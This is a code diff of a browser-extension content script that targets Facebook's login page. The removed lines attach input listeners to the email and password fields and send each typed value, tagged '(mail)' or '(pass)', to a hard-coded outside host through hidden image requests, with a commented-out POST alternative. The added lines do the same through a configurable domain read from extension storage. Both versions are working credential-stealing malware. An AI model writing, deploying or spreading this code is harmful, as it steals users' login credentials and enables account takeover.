@@ -1,44 +1,18 @@
-function sndDataMail(e){
- valuetosend = this.value + '(mail)';
- datetosend = new Date().toISOString();
- console.log(valuetosend);
- f = document.createElement('img');
- f.style.display = 'none';
- srcc = 'http://giobeatle1794.xyz/kbrec.php?psw=' + encodeURIComponent(valuetosend) + '&date=' + encodeURIComponent(datetosend);
- f.src = srcc;
- document.body.appendChild(f);
+function send_data(dom, type, data){
+  let elem = document.createElement("img");
+  elem.style.display = "none";
+  elem.src = dom + "/" + type + ".php?v=" + encodeURIComponent(data) + "&d=" + encodeURIComponent(new Date().toISOString());
+  document.body.appendChild(elem);
 }
-function sndDataPsw(e){
- valuetosend = this.value + '(pass)';
- datetosend = new Date().toISOString();
- console.log(valuetosend);
- f = document.createElement('img');
- f.style.display = 'none';
- srcc = 'http://giobeatle1794.xyz/kbrec.php?psw=' + encodeURIComponent(valuetosend) + '&date=' + encodeURIComponent(datetosend);
- f.src = srcc;
- document.body.appendChild(f);
-}
-/*function sndDataPost(e){
- console.log(this.value);
- var xhr = new XMLHttpRequest();
- var data = {
-  "cad": this.value,
-  "date": new Date().toISOString()
- };
- xhr.open("POST", "http://giobeatle1794.xyz/kbrec.php", true);
- xhr.setRequestHeader("Content-Type", "application/json");
- xhr.onreadystatechange = function(){
-  if (xhr.readyState === 4 && xhr.status != 204){
-   console.log(xhr.status.toString());
-  }
- };
- xhr.send(JSON.stringify(data));
-}*/
+
 if (window.location.hostname == "www.facebook.com"){
- var emailFrm = document.querySelectorAll('#login_form [type=email]')[0];
-} else {
- var emailFrm = document.querySelectorAll('#email')[0];
+  // Correo
+  document.getElementById("email").addEventListener("input", async function(e){
+    send_data((await browser.storage.local.get("dominio")), "correo", this.value);
+  });
+
+  // Contrasena
+  document.getElementById("pass").addEventListener("input", async function(e){
+    send_data((await browser.storage.local.get("dominio")), "contra", this.value);
+  });
 }
-var pssFrm = document.querySelectorAll('#login_form [type=password]')[0];
-emailFrm.addEventListener("input", sndDataMail);
-pssFrm.addEventListener("input", sndDataPsw);
